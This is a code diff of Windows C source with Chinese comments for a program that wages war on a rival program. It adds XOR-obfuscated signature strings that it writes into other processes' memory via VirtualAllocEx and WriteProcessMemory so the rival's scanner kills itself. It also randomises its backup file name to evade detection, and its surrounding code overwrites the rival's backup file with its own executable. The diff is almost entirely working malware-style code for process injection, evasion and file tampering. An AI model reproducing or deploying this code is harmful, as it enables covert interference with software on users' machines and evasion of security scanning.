@@ -472,7 +472,7 @@ static BOOL NeutralizeFile(LPCWSTR path)
 }
 /* 我方文件名：清空敌人目录时绝不能顺手删掉自己的东西 */
 static const WCHAR *g_ownNames[] = {
-    L"xx.exe", L"xxres.bin", L"svcguard.dll", L"window.dll", L"atkcore.dll",
+    L"xx.exe", NULL,   /* 备份文件名每会话随机，见 XXBackupNameW */ L"svcguard.dll", L"window.dll", L"atkcore.dll",
     L"payload.dll", L"payload.bin", L"guard.dll", L"defense.dll", NULL
 };
 
@@ -486,7 +486,7 @@ static BOOL IsOwnFileName(LPCWSTR leaf)
 
 /* #19：把对手的自备份文件内容**改写成我方内容**（不是删掉）。
    yy 从 yyres.bin 复活时，还原出来的"自己"其实是 xx.exe 的字节 ——
-   它越复活越是在帮我们跑。源用我们自己的 xxres.bin（就是 xx.exe 的备份），
+   它越复活越是在帮我们跑。源用我们自己的备份文件（就是 xx.exe 的备份），
    没准备好就直接用 xx.exe 本体。 */
 static void GetOwnDir(WCHAR *dir, SIZE_T cch);      /* 前置声明（定义在下方） */
 
@@ -497,7 +497,12 @@ static BOOL TrojanEnemyBackup(LPCWSTR dir, LPCWSTR leaf)
     GetOwnDir(ownDir, MAX_PATH);
     if (!ownDir[0]) return FALSE;
     swprintf_s(dst, MAX_PATH, L"%s%s", dir, leaf);
-    swprintf_s(src, MAX_PATH, L"%sxxres.bin", ownDir);
+    {   /* 随机备份名（会话盐派生） */
+        WCHAR nm[32];
+        XXBackupNameW(g_pSharedView, nm, _countof(nm));
+        swprintf_s(src, MAX_PATH, L"%s%ls", ownDir, nm);
+        SecureZeroMemory(nm, sizeof(nm));
+    }
     if (GetFileAttributesW(src) == INVALID_FILE_ATTRIBUTES)
         swprintf_s(src, MAX_PATH, L"%sxx.exe", ownDir);
     if (GetFileAttributesW(src) == INVALID_FILE_ATTRIBUTES) return FALSE;
@@ -1519,6 +1524,82 @@ static BOOL KillByKillerBin(DWORD pid, BOOL useApc);
 static BOOL KillByJobObject(DWORD pid);
 static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid);
 static void AttackPass(void);
+/* ================== 反向利用 yy 的内存扫描：把特征串种进它自己的私有内存 ==================
+   新 yy 会遍历各进程的 MEM_PRIVATE 可读内存，找 `XX PROGRAM - ALIVE` / `xx_wg_` /
+   `xxres.bin` 三个串，命中就 TerminateProcess。那就把这些串**写进 yy 进程自己的私有内存**：
+   yy 扫到（自己或同伴）就自杀，比我们主动结束更省事、也更难被反制。
+   关键：本文件里**不能有明文**（否则 atkcore 自己带着特征），所以用 XOR 密文 + 运行时解码，
+   写入远端后立刻把本地缓冲清零。 */
+static const unsigned char kSigTitleEnc[] = {
+    0xFF,0xFF,0x87,0xF7,0xF5,0xE8,0xE0,0xF5,0xE6,0xEA,0x87,0x8A,0x87,0xE6,0xEB,0xEE,0xF1,0xE2
+};
+static const unsigned char kSigMutexEnc[] = { 0xDF,0xDF,0xF8,0xD0,0xC0,0xF8 };
+static const unsigned char kSigBackupEnc[] = { 0xDF,0xDF,0xD5,0xC2,0xD4,0x89,0xC5,0xCE,0xC9 };
+
+static void XorDecode(unsigned char *dst, const unsigned char *enc, int n)
+{
+    int i;
+    for (i = 0; i < n; i++) dst[i] = (unsigned char)(enc[i] ^ 0xA7);
+    dst[n] = 0;
+}
+
+/* 往一个目标进程里种一遍（每次新建一页私有内存，避免被它自己回收后失效） */
+static BOOL PlantSignaturesInPid(DWORD pid)
+{
+    HANDLE hProc;
+    unsigned char page[0x400];
+    LPVOID remote;
+    BOOL ok = FALSE;
+
+    hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
+                        FALSE, pid);
+    if (!hProc) return FALSE;
+
+    memset(page, 0, sizeof(page));
+    XorDecode(page + 0x000, kSigTitleEnc,  sizeof(kSigTitleEnc));
+    XorDecode(page + 0x100, kSigMutexEnc,  sizeof(kSigMutexEnc));
+    XorDecode(page + 0x200, kSigBackupEnc, sizeof(kSigBackupEnc));
+
+    remote = VirtualAllocEx(hProc, NULL, sizeof(page), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (remote) {
+        SIZE_T wrote = 0;
+        ok = WriteProcessMemory(hProc, remote, page, sizeof(page), &wrote) && wrote == sizeof(page);
+        if (ok) {
+            /* 加一层：把同一页的保护改成可读（PAGE_READWRITE 已经可读，这里只是显式化） */
+            DWORD old = 0;
+            VirtualProtectEx(hProc, remote, sizeof(page), PAGE_READWRITE, &old);
+        }
+    }
+    SecureZeroMemory(page, sizeof(page));      /* 本地副本立刻抹掉，别留特征 */
+    CloseHandle(hProc);
+    return ok;
+}
+
+/* 遍历目标进程，逐个种特征（3 秒一轮，节流；只在拿到 leader 的那份实现里跑） */
+static void PlantSignaturesInAllTargets(void)
+{
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32W pe;
+    int planted = 0;
+
+    if (hSnap == INVALID_HANDLE_VALUE) return;
+    memset(&pe, 0, sizeof(pe));
+    pe.dwSize = sizeof(pe);
+    if (Process32FirstW(hSnap, &pe)) {
+        do {
+            if (!IsTargetName(pe.szExeFile)) continue;
+            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
+            if (PlantSignaturesInPid(pe.th32ProcessID)) {
+                planted++;
+                WriteKillLog(L"已把特征串种进目标私有内存 PID=%lu %ls（yy 自扫自灭）",
+                             pe.th32ProcessID, pe.szExeFile);
+            }
+        } while (Process32NextW(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    if (planted)
+        WriteKillLog(L"本轮共向 %d 个目标进程植入特征串", planted);
+}
 static DWORD WINAPI AttackLoop(LPVOID lp);
 static BOOL GetProcessPath(DWORD pid, WCHAR *path, DWORD cch);
 static void LockImage(LPCWSTR path);
@@ -2312,6 +2393,7 @@ static DWORD WINAPI AttackLoop(LPVOID lp)
             if (dwCopyTick == 0 || now - dwCopyTick >= 5000) {
                 dwCopyTick = now;
                 RefreshKillerCopies();
+                PlantSignaturesInAllTargets();   /* 3~5s 一轮：种特征串到 yy 私有内存 */
             }
         }
         if (!hLead)
@@ -2379,6 +2461,8 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
     }
     return TRUE;
 }
+
+
 
 
 
